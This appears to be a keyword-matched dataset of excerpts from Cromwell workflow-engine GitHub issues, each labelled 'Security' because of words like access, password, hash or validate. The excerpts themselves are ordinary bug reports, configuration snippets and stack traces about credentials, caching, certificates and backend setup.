Security,"https://github.com/broadinstitute/cromwell/blob/4c386f80ab83e78c953e412382526a47d6b36ba4/cromwell.example.backends/TES.conf#L32. There is a missing `}` in this file. It also doesn't seem to work if used with Funnel (https://github.com/ohsu-comp-bio/funnel) as TES back end, although the error happens after the TES execution is complete:. ```; [INFO] [04/28/2020 13:37:00.957] [cromwell-system-akka.dispatchers.backend-dispatcher-63] [akka://cromwell-system/user/SingleWorkflowRunnerActor/WorkflowManagerActor/WorkflowActor-18b18b73-17d7-4569-a58f-e44af1ec43a5/WorkflowExecutionActor-18b18b73-17d7-4569-a58f-e44af1ec43a5/18b18b73-17d7-4569-a58f-e44af1ec43a5-EngineJobExecutionActor-md5_.cwl:NA:1/18b18b73-17d7-4569-a58f-e44af1ec43a5-BackendJobExecutionActor-md5_.cwl:NA:1/TesAsyncBackendJobExecutionActor] TesAsyncBackendJobExecutionActor [UUID(18b18b73)md5_.cwl:NA:1]: Status change from - to Complete; [INFO] [04/28/2020 13:37:01.083] [cromwell-system-akka.dispatchers.engine-dispatcher-41] [akka://cromwell-system/user/SingleWorkflowRunnerActor/WorkflowManagerActor] WorkflowManagerActor Workflow 18b18b73-17d7-4569-a58f-e44af1ec43a5 failed (during ExecutingWorkflowState): Job md5_.cwl:NA:1 exited with return code 1 which has not been declared as a valid return code. See 'continueOnReturnCode' runtime attribute for more details.; Check the content of stderr for potential additional information: /Users/asenf/devel/alexandersenf/cromwelltes/cromwell-executions/md5_.cwl/18b18b73-17d7-4569-a58f-e44af1ec43a5/call-md5_.cwl/execution/stderr.; [First 300 bytes]:mkdir: cannot create directory '/cromwell-executions/md5_.cwl/18b18b73-17d7-4569-a58f-e44af1ec43a5/call-md5_.cwl/tmp.7db856a3': Read-only file system; chmod: cannot access '': No such file or directory; mkfifo: cannot create fifo '/out.1': Read-only file system; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5499:1730,access,access,1730,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5499,1,['access'],['access']
Security,"i cannot use function as_map to convert Array[Pair[String, File]] to Map[String, File] when i using cromwell or womtool，the executing software edition of i used is number 62 whether cromwell or womtool ，The screenshot is as follows：; ![image](https://user-images.githubusercontent.com/77706356/118239739-bcdf2200-b4cc-11eb-94cb-e5fdce8145da.png). <!--; Hi! Thanks for taking the time to report feedback. Before posting an issue over in Jira tracker, please check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're almost in the right place. -->. <!-- You'll want to go to https://broadworkbench.atlassian.net/projects/BA/issues and then tell us: -->. <!-- Which backend are you running? -->. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6354:1229,PASSWORD,PASSWORDS,1229,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6354,1,['PASSWORD'],['PASSWORDS']
Security,"i have to working for without a network platform, used docker load to import docker and turned off Docker Hash Lookup, but still reported the following error; ![image](https://github.com/broadinstitute/cromwell/assets/38648009/b1b66326-f1db-4d60-a2f1-5ea535160ddd)",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7222:106,Hash,Hash,106,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7222,1,['Hash'],['Hash']
Security,"ial Broad workflows (for example [this one](https://github.com/gatk-workflows/gatk3-data-processing)), on Cromwell 36 setup on AWS, I get the following error:. ```; Caused by: cromwell.backend.validation.ValidatedRuntimeAttributesBuilder$$anon$1: Runtime attribute validation failed:; :; Disk strings should be of the format 'local-disk' or '/mount/point' but got: 'local-disk 100 HDD'; at cromwell.backend.validation.ValidatedRuntimeAttributesBuilder.build(ValidatedRuntimeAttributesBuilder.scala:62); at cromwell.backend.validation.ValidatedRuntimeAttributesBuilder.build$(ValidatedRuntimeAttributesBuilder.scala:56); at cromwell.backend.standard.StandardValidatedRuntimeAttributesBuilder$StandardValidatedRuntimeAttributesBuilderImpl.build(StandardValidatedRuntimeAttributesBuilder.scala:20); at cromwell.backend.standard.StandardCachingActorHelper.validatedRuntimeAttributes(StandardCachingActorHelper.scala:56); at cromwell.backend.standard.StandardCachingActorHelper.validatedRuntimeAttributes$(StandardCachingActorHelper.scala:54); at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.validatedRuntimeAttributes$lzycompute(AwsBatchAsyncBackendJobExecutionActor.scala:74); at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.validatedRuntimeAttributes(AwsBatchAsyncBackendJobExecutionActor.scala:74); at cromwell.backend.standard.StandardCachingActorHelper.startMetadataKeyValues(StandardCachingActorHelper.scala:75); at cromwell.backend.standard.StandardCachingActorHelper.startMetadataKeyValues$(StandardCachingActorHelper.scala:74); at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.startMetadataKeyValues$lzycompute(AwsBatchAsyncBackendJobExecutionActor.scala:362); at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.startMetadataKeyValues(AwsBatchAsyncBackendJobExecutionActor.scala:362); at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover(StandardAsyncExecutionActor.scala:942); at cromwell.backend.stand",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4274:995,validat,validatedRuntimeAttributes,995,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4274,1,['validat'],['validatedRuntimeAttributes']
Security,"ich backend are you running? -->; Backend: GCP Batch; <!-- Paste/Attach your workflow if possible: -->; ```; version 1.0. task hello {. input {; String name; }; command <<<; echo 'hello ~{name}!'; >>>. output {; File response = stdout(); }. runtime {; docker: ""ubuntu:latest""; cpu: 1; memory: ""3.75 GB""; }; }; workflow test {; call hello. output {; File response = hello.response; }; }; ```. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->; ```hoco; backend {; default = ""batch""; providers {; batch {; actor-factory = ""cromwell.backend.google.batch.GcpBatchBackendLifecycleActorFactory""; config {. # The Project To execute in; project = ""${compute_project}"". # The bucket where outputs will be written to; root = ""gs://${bucket}"". # Polling for completion backs-off gradually for slower-running jobs.; # This is the maximum polling interval (in seconds):; maximum-polling-interval = 600. # Optional configuration to use high security network (Virtual Private Cloud) for running jobs.; # See https://cromwell.readthedocs.io/en/stable/backends/Google/ for more details.; # virtual-private-cloud {; # network-label-key = ""network-key""; # auth = ""application-default""; # }. # Global pipeline timeout; # Defaults to 7 days; max 30 days; # batch-timeout = 7 days. genomics {; auth = ""cromwell-service-account""; location: ""${region}""; compute-service-account = ""${compute_service_account}"". # Specifies the minimum file size for `gsutil cp` to use parallel composite uploads during delocalization.; # Parallel composite uploads can result in a significant improvement in delocalization speed for large files; # but may introduce complexities in downloading such files from GCS, please see; # https://cloud.google.com/storage/docs/gsutil/commands/cp#parallel-composite-uploads for more information.; #; # If set to 0 parallel composite uploads are turned off. The default Cromwell configuration turns off; # parallel composite uploads, this sa",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7238:1806,secur,security,1806,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7238,1,['secur'],['security']
Security,"ich shows I am using a `profileName=default`. Looked through the code a bit but couldn't find where I can add that profilename to the config. If there is a way to change the profile name I would definitely use it, if not then I can set things up differently. Thanks. `cromwell_1 | Caused by: software.amazon.awssdk.core.exception.SdkClientException: Unable to load credentials from any of the providers in the chain AwsCredentialsProviderChain(credentialsProviders=[SystemPropertyCredentialsProvider(), EnvironmentVariableCredentialsProvider(), ProfileCredentialsProvider(profileName=default, profileFile=ProfileFile(profiles=[Profile(name=service1, properties=[aws_access_key_id, aws_secret_access_key]), Profile(name=service2, properties=[aws_access_key_id, aws_secret_access_key])])), ContainerCredentialsProvider(), InstanceProfileCredentialsProvider()]) : [SystemPropertyCredentialsProvider(): Unable to load credentials from system settings. Access key must be specified either via environment variable (AWS_ACCESS_KEY_ID) or system property (aws.accessKeyId)., EnvironmentVariableCredentialsProvider(): Unable to load credentials from system settings. Access key must be specified either via environment variable (AWS_ACCESS_KEY_ID) or system property (aws.accessKeyId)., ProfileCredentialsProvider(profileName=default, profileFile=ProfileFile(profiles=[Profile(name=service1, properties=[aws_access_key_id, aws_secret_access_key]), Profile(name=service2, properties=[aws_access_key_id, aws_secret_access_key])])): Profile file contained no credentials for profile 'default': ProfileFile(profiles=[Profile(name=service1, properties=[aws_access_key_id, aws_secret_access_key]), Profile(name=service2, properties=[aws_access_key_id, aws_secret_access_key])]), ContainerCredentialsProvider(): Cannot fetch credentials from container - neither AWS_CONTAINER_CREDENTIALS_FULL_URI or AWS_CONTAINER_CREDENTIALS_RELATIVE_URI environment variables are set., InstanceProfileCredentialsProvider(): Unable",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5452:1772,Access,Access,1772,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5452,1,['Access'],['Access']
Security,"idation$1$adapted(AwsAuthMode.scala:69); 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.$anonfun$validateCredential$1(AwsAuthMode.scala:84); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); 	at scala.util.Try$.apply(Try.scala:209); 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.validateCredential(AwsAuthMode.scala:84); 	... 48 common frames omitted; 2019-07-02 19:16:37,967 cromwell-system-akka.dispatchers.engine-dispatcher-30 ERROR - WorkflowManagerActor Workflow 10f172e8-b7ba-416f-964e-22ab8c7b38e3 failed (during MaterializingWorkflowDescriptorState): java.lang.RuntimeException: Credentials are invalid: software.amazon.awssdk.http.SdkHttpService: Provider software.amazon.awssdk.http.apache.ApacheSdkHttpService not found; 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.validateCredential(AwsAuthMode.scala:85); 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.validateCredential$(AwsAuthMode.scala:83); 	at cromwell.cloudsupport.aws.auth.DefaultMode.validateCredential(AwsAuthMode.scala:116); 	at cromwell.cloudsupport.aws.auth.DefaultMode._credential$lzycompute(AwsAuthMode.scala:127); 	at cromwell.cloudsupport.aws.auth.DefaultMode._credential(AwsAuthMode.scala:117); 	at cromwell.cloudsupport.aws.auth.DefaultMode.credential(AwsAuthMode.scala:130); 	at cromwell.filesystems.s3.S3PathBuilder$.fromAuthMode(S3PathBuilder.scala:118); 	at cromwell.filesystems.s3.S3PathBuilderFactory.withOptions(S3PathBuilderFactory.scala:59); 	at cromwell.core.path.PathBuilderFactory$.$anonfun$instantiatePathBuilders$2(PathBuilderFactory.scala:23); 	at cats.instances.ListInstances$$anon$1.$anonfun$traverse$2(list.scala:74); 	at cats.instances.ListInstances$$anon$1.loop$2(list.scala:64); 	at cats.instances.ListInstances$$anon$1.$anonfun$foldRight$1(list.scala:64); 	at cats.Eval$$anon$11.$anonfun$start$3(Eval.scala:275); 	at cats.Eval$.loop$1(Eval.scala:336); 	at cats.Eval$.cats$Eval$$evaluate(Eval.scala:368); 	at cats.Eval$Defer.value(Eval.scala:257); 	at cats.instances.Li",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5056#issuecomment-507840273:9520,validat,validateCredential,9520,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5056#issuecomment-507840273,1,['validat'],['validateCredential']
Security,idatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target; at java.base/sun.security.validator.PKIXValidator.doBuild(PKIXValidator.java:388); at java.base/sun.security.validator.PKIXValidator.engineValidate(PKIXValidator.java:271); at java.base/sun.security.validator.Validator.validate(Validator.java:256); at java.base/sun.security.ssl.X509TrustManagerImpl.checkTrusted(X509TrustManagerImpl.java:284); at java.base/sun.security.ssl.X509TrustManagerImpl.checkServerTrusted(X509TrustManagerImpl.java:144); at io.grpc.netty.shaded.io.netty.handler.ssl.ReferenceCountedOpenSslClientContext$ExtendedTrustManagerVerifyCallback.verify(ReferenceCountedOpenSslClientContext.java:234); at io.grpc.netty.shaded.io.netty.handler.ssl.ReferenceCountedOpenSslContext$AbstractCertificateVerifier.verify(ReferenceCountedOpenSslContext.java:779); at io.grpc.netty.shaded.io.netty.internal.tcnative.CertificateVerifierTask.runTask(CertificateVerifierTask.java:36); at io.grpc.netty.shaded.io.netty.internal.tcnative.SSLTask.run(SSLTask.java:48); at io.grpc.netty.shaded.io.netty.internal.tcnative.SSLTask.run(SSLTask.java:42); at io.grpc.netty.shaded.io.netty.handler.ssl.ReferenceCountedOpenSslEngine.runAndResetNeedTask(ReferenceCountedOpenSslEngine.java:1496); at io.grpc.netty.shaded.io.netty.handler.ssl.ReferenceCountedOpenSslEngine.access$700(ReferenceCountedOpenSslEngine.java:94); at io.grpc.netty.shaded.io.netty.handler.ssl.ReferenceCountedOpenSslEngine$TaskDecorator.run(ReferenceCountedOpenSslEngine.java:1471); at io.grpc.netty.shaded.io.netty.handler.ssl.SslHandler$SslTasksRunner.run(SslHandler.java:1787); at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1144); at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:642); ... 1 common frames omitted; Caused by: sun.security.provider.certpath.SunCertPathBuilderException: ,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7551:7875,Certificate,CertificateVerifierTask,7875,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7551,1,['Certificate'],['CertificateVerifierTask']
Security,"iders.Local.caching.check-sibling-md5` - will check if a sibling file with the same name and the .md5 extension exists, and if it does, use the content of this file as a hash. ## My takeaway. - I can't use a `softlink` cache duplication strategy as it's not allowed for containers. - If I select the `path+modtime` hashing strategy, only the first task in a workflow will succeed, as the hard-link duplication strategy will cause the path ""absolute"" be different (causing a hash differential). ## Questions. - ~What defines a cache hit, or exactly which information is used to the call hash?~; > I'll answer this one myself, by looking at the metadata returned from `/api/workflows/{version}/{id}/metadata`, within the `calls.$yourstepname.callCaching`, the hashes field has the following attributes:; > - `output count`; > - `runtime attribute`; > - `output expression`; > - `input count`; > - `backend name`; > - `command template`; > - `input`. - ~When does the command section get hashed (before or after replacements)?~; > The template gets cached. - ~What other elements go into the building the cache?~; > output count, runtime attribute, output expression, input count, backend name, command template, input. - What are the downsides with `check-sibling-md5`, can it be used in conjunction with `system.file-hash-cache`. - **Is the only way to use call-caching with containers without fully hashing the file?**. ## Possible resolutions. I was thinking the following might be potential solutions for my problem, but I don't know how good / bad they are, and they'd require changes to Cromwell. - Potential for a _cheaper_ (and potentially dirtier) hash for files? ; - When cromwell links from a cached result, store a map of { newpath : original } link to use or call caching, so when the hashDifferential is calculated, it uses the hash of the original cached result. (This would mean we could use the path+modtime strategy). ## Current attempt. I realised I may have run into another error h",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5346:2910,hash,hashed,2910,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5346,1,['hash'],['hashed']
Security,if we do this from a workflow:; ```wdl; call foo { input: x = 5 }; ```. Then we should fail validation if `x` is not an input of `foo`,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2967:92,validat,validation,92,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2967,1,['validat'],['validation']
Security,"ilesystems/s3/src/main/java/org/lerch/s3fs/AmazonS3Factory.java#L81) | [elerch-sdk2/AmazonS3Factory.java](https://github.com/elerch/Amazon-S3-FileSystem-NIO2/blob/sdk2/src/main/java/org/lerch/s3fs/AmazonS3Factory.java#L82) |; | Region not set by props | [cromwell-37/AmazonS3Factory.java](https://github.com/broadinstitute/cromwell/blob/37/filesystems/s3/src/main/java/org/lerch/s3fs/AmazonS3Factory.java#L59) | [elerch-sdk2/AmazonS3Factory.java](https://github.com/elerch/Amazon-S3-FileSystem-NIO2/blob/sdk2/src/main/java/org/lerch/s3fs/AmazonS3Factory.java#L57) |; | (Attempted) props read from env | [cromwell-37/AmazonS3Factory.java](https://github.com/broadinstitute/cromwell/blob/37/filesystems/s3/src/main/java/org/lerch/s3fs/S3FileSystemProvider.java#L95-L96) | [elerch-sdk2/S3FileSystemProvider.java](https://github.com/elerch/Amazon-S3-FileSystem-NIO2/blob/sdk2/src/main/java/org/lerch/s3fs/S3FileSystemProvider.java#L94-L95) |. ### Acceptance Criteria. The existing four centaur tests (two run in Travis, two nightly in Jenkins) should pass using non-default credentials:; - Switch the `aws_application.conf` to use auth scheme `custom_keys` in a rendered template with secrets embedded; - Remove the files `aws_credentials.ctmpl` and `aws_config`; - Update `testCentaurAws.sh` removing `AWS_SHARED_CREDENTIALS_FILE` and `AWS_CONFIG_FILE` exports; - **Maybe**: It isn't clear that installing the `awscli` should be required. Remove this from the `testCentaurAws.sh` and see if the tests still work using just the embedded Java S3 SDK.; - Update `.gitignore` replacing `aws_credentials` with `aws_application.conf`; - **Maybe**: Add a second backend that **does** use some form of default authorization; - If adding this test, please ensure that the non-default credentials are NOT accidentally falling-back to the default credentials. ### TL;DR. **It's unclear how cromwell calls to S3 broke in 37+, but CI testing with non-default credentials should hopefully reproduce reported errors.**",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4740:3637,authoriz,authorization,3637,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4740,1,['authoriz'],['authorization']
Security,"ime attribute keys: dx_timeout; [2022-12-15 21:27:50,35] [info] BT-322 9e4f5894:main.assessment_ages:-1:1 cache hit copying success with aggregated hashes: initial = EEC3507DAE39FE605FDE6F9F6FC0A5A8, file = EF056BD27B3A512F77663A400D778CCF.; [2022-12-15 21:27:50,35] [info] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-EngineJobExecutionActor-main.assessment_ages:NA:1 [9e4f5894]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:27:50,48] [info] WorkflowExecutionActor-9e4f5894-f7e6-4e2f-be4b-f547d6de7fff [9e4f5894]: Job results retrieved (CallCached): 'main.assessment_ages' (scatter index: None, attempt 1); [2022-12-15 21:27:50,82] [warn] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-BackendCacheHitCopyingActor-9e4f5894:main.genetic_sex:-1:1-20000000011 [9e4f5894main.genetic_sex:NA:1]: Unrecognized runtime attribute keys: dx_timeout; [2022-12-15 21:27:50,82] [info] BT-322 9e4f5894:main.genetic_sex:-1:1 cache hit copying success with aggregated hashes: initial = FD7DC79B974CF6706FC3376F067965B9, file = EF056BD27B3A512F77663A400D778CCF.; [2022-12-15 21:27:50,82] [info] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-EngineJobExecutionActor-main.genetic_sex:NA:1 [9e4f5894]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:27:54,15] [info] WorkflowExecutionActor-9e4f5894-f7e6-4e2f-be4b-f547d6de7fff [9e4f5894]: Job results retrieved (CallCached): 'main.genetic_sex' (scatter index: None, attempt 1); [2022-12-15 21:27:55,79] [warn] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-BackendCacheHitCopyingActor-9e4f5894:main.categorical_covariates:0:1-20000000027 [9e4f5894main.categorical_covariates:0:1]: Unrecognized runtime attribute keys: dx_t; imeout; [2022-12-15 21:27:55,79] [info] BT-322 9e4f5894:main.categorical_covariates:0:1 cache hit copying success with aggregated hashes: initial = C760DC2B9015D0B787EF7BEE7D21AA58, file = EF056BD27B3A512F77663A400D778CCF.; [2022-12-15 21:27:55,79] [info] 9e4f5894-f7e6-4e2f-be4b-f547d6d",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6971:29673,hash,hashes,29673,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6971,1,['hash'],['hashes']
Security,"imeoutSupport.$anonfun$after$1(FutureTimeoutSupport.scala:26); 	at akka.actor.Scheduler$$anon$4.run(Scheduler.scala:205); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: common.exception.AggregatedMessageException: Error(s):; Error evaluating ad hoc files:; <path_prefix>/cromwell/cromwell-executions/main/c9194073-c6ed-4c2a-97d6-fbc6a2314883/call-main/execution/centaur/src/main/resources/standardTestCases/cwl_dynamic_initial_workdir/testdir; 	at common.validation.Validation$ValidationTry$.toTry$extension1(Validation.scala:77); 	at common.validation.Validation$ValidationTry$.toTry$extension0(Validation.scala:73); 	at cromwell.backend.standard.StandardAsyncExecutionActor.instantiatedCommand(StandardAsyncExecutionActor.scala:579); 	... 35 common frames omitted; ```. The above stack trace was consuming the actual error:; `NoSuchFileException:<path_prefix>/cromwell/cromwell-executions/main/c9194073-c6ed-4c2a-97d6-fbc6a2314883/call-main/execution/centaur/src/main/resources/standardTestCases/cwl_dynamic_initial_workdir/testdir; `. Somewhere while resolving host to call root, instead of returning the path to inputs as `centaur/src/main/resources/standardTestCases/cwl_dynamic_initial_workdir/testdir`, it resolves the path by prefixing the call root context path, which is `<path_prefix>/cromwell/cromwell-executions/main/c9194073-c6ed-4c2a-97d6-fbc6a2314883/call-main/execution`. As a result, it tries to look for inputs inside the `execution` folder rather than inside `centaur/.../testdir`. This test passes in Travis and it might have d",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4725#issuecomment-472514211:4694,validat,validation,4694,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4725#issuecomment-472514211,1,['validat'],['validation']
Security,"in PAPI.; slow-job-warning-time: 24 hours. # Set this to the lower of the two values ""Queries per 100 seconds"" and ""Queries per 100 seconds per user"" for; # your project.; #; # Used to help determine maximum throughput to the Google Genomics API. Setting this value too low will; # cause a drop in performance. Setting this value too high will cause QPS based locks from Google.; # 1000 is the default ""Queries per 100 seconds per user"", 50000 is the default ""Queries per 100 seconds""; # See https://cloud.google.com/genomics/quotas for more information; genomics-api-queries-per-100-seconds = 10000. # Polling for completion backs-off gradually for slower-running jobs.; # This is the maximum polling interval (in seconds):; maximum-polling-interval = 600. # Optional Dockerhub Credentials. Can be used to access private docker images.; dockerhub {; # account = """"; # token = """"; }. # Number of workers to assign to PAPI requests; request-workers = 3. # Optional configuration to use high security network (Virtual Private Cloud) for running jobs.; # See https://cromwell.readthedocs.io/en/stable/backends/Google/ for more details.; # virtual-private-cloud {; # network-label-key = ""network-key""; # auth = ""service-account""; # }. # Global pipeline timeout; # Defaults to 7 days; max 30 days; # pipeline-timeout = 7 days. genomics {; # A reference to an auth defined in the `google` stanza at the top. This auth is used to create; # Pipelines and manipulate auth JSONs.; auth = ""service-account"". // alternative service account to use on the launched compute instance; // NOTE: If combined with service account authorization, both that serivce account and this service account; // must be able to read and write to the 'root' GCS path; compute-service-account = ""default"". # Endpoint for APIs, no reason to change this unless directed by Google.; endpoint-url = ""https://lifesciences.googleapis.com/"". # Currently Cloud Life Sciences API is available only in `us-central1` and `europe-west2` location",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6469:11948,secur,security,11948,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6469,1,['secur'],['security']
Security,"ine-dispatcher-31 INFO - WorkflowManagerActor Successfully started WorkflowActor-10f172e8-b7ba-416f-964e-22ab8c7b38e3; 2019-07-02 19:16:37,248 cromwell-system-akka.dispatchers.engine-dispatcher-31 INFO - Retrieved 1 workflows from the WorkflowStoreActor; 2019-07-02 19:16:37,271 cromwell-system-akka.dispatchers.engine-dispatcher-29 INFO - WorkflowStoreHeartbeatWriteActor configured to flush with batch size 10000 and process rate 2 minutes.; 2019-07-02 19:16:37,932 cromwell-system-akka.dispatchers.engine-dispatcher-29 ERROR - Credentials are invalid: software.amazon.awssdk.http.SdkHttpService: Provider software.amazon.awssdk.http.apache.ApacheSdkHttpService not found; java.lang.RuntimeException: Credentials are invalid: software.amazon.awssdk.http.SdkHttpService: Provider software.amazon.awssdk.http.apache.ApacheSdkHttpService not found; 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.validateCredential(AwsAuthMode.scala:85); 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.validateCredential$(AwsAuthMode.scala:83); 	at cromwell.cloudsupport.aws.auth.DefaultMode.validateCredential(AwsAuthMode.scala:116); 	at cromwell.cloudsupport.aws.auth.DefaultMode._credential$lzycompute(AwsAuthMode.scala:127); 	at cromwell.cloudsupport.aws.auth.DefaultMode._credential(AwsAuthMode.scala:117); 	at cromwell.cloudsupport.aws.auth.DefaultMode.credential(AwsAuthMode.scala:130); 	at cromwell.filesystems.s3.S3PathBuilder$.fromAuthMode(S3PathBuilder.scala:118); 	at cromwell.filesystems.s3.S3PathBuilderFactory.withOptions(S3PathBuilderFactory.scala:59); 	at cromwell.core.path.PathBuilderFactory$.$anonfun$instantiatePathBuilders$2(PathBuilderFactory.scala:23); 	at cats.instances.ListInstances$$anon$1.$anonfun$traverse$2(list.scala:74); 	at cats.instances.ListInstances$$anon$1.loop$2(list.scala:64); 	at cats.instances.ListInstances$$anon$1.$anonfun$foldRight$1(list.scala:64); 	at cats.Eval$$anon$11.$anonfun$start$3(Eval.scala:275); 	at cats.Eval$.loop$1(Eval.scala:336); 	at cats.Eval$.cats$Eval$$",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5056#issuecomment-507840273:1719,validat,validateCredential,1719,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5056#issuecomment-507840273,1,['validat'],['validateCredential']
Security,"ing on a scatter job and some of the scatter jobs get a cache hit but others get a cache miss. . I have queried the METADATA_ENTRY table for the two workflows and all the call cache entries look identical. . Here is my process:. 1. I queried METADATA_ENTRY with this WHERE condition: `(WORKFLOW_EXECUTION_UUID ='29791b64-b47a-44ba-aff0-7ab48bc10677' or WORKFLOW_EXECUTION_UUID ='5de042e3-7a03-4c77-8972-f0e4cd010e4b') and CALL_FQN = 'sampleLevelWorkflow_WGS.align' and JOB_SCATTER_INDEX =0`; 2. I sort by METADATA_KEY; 3. Then I go down the list and compare the hashes for the two workflows for each METADATA_KEY. Here is a case where workflow 29791b64 is a restart of 5de042e3. (Workflow 5de042e3 is itself a restart but I don't think that is important here.) I have shown below all the records from METADATA_ENTRY that start with ""callCaching"" and they all look identical, yet it clearly says it is a ""Cache Miss"". **Is there anywhere I can see a log message stating exactly which hashes resulted in the cache miss?** I have tried to enable LOG_LEVEL=DEBUG but couldn't see it there. Thanks in advance for your help!. |WORKFLOW_EXECUTION_UUID|METADATA_KEY|METADATA_VALUE|; |-----------------------|------------|--------------|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:result|Cache Miss|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:result|Cache Miss|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hit|false|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hit|false|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:runtime attribute:failOnStderr|68934A3E9455FA72420237EB05902327|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:runtime attribute:failOnStderr|68934A3E9455FA72420237EB05902327|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:runtime attribute:docker|4AD3C387725244C1348F252B031B956D|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:runtime attribute:docker|4AD3C387725244C1348F252B031B956D|; |5de042e3-7a03-4c77-8972-f0",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7248:1079,hash,hashes,1079,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7248,1,['hash'],['hashes']
